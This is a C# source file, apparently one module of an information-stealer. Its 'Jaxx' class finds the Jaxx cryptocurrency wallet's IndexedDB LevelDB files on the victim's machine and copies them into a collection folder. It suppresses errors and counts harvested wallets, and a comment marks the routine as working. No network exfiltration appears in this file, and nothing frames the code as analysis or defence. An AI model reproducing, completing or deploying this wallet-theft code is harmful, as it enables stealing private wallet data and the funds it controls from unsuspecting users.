using System.IO;

namespace GetLucky
{
    class Jaxx
    {
        public static int count = 0;
        public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
        public static string JaxxDir2 = Help.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
        public static void JaxxStr(string directorypath)  // Works
        {
            try
            {
                if (Directory.Exists(JaxxDir2))
                {
                    foreach (FileInfo file in new DirectoryInfo(JaxxDir2).GetFiles())
                    {
                        Directory.CreateDirectory(directorypath + JaxxDir);
                        file.CopyTo(directorypath + JaxxDir + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
                else
                {
                    return;
                }

            }
            catch {}
        }
    }
}
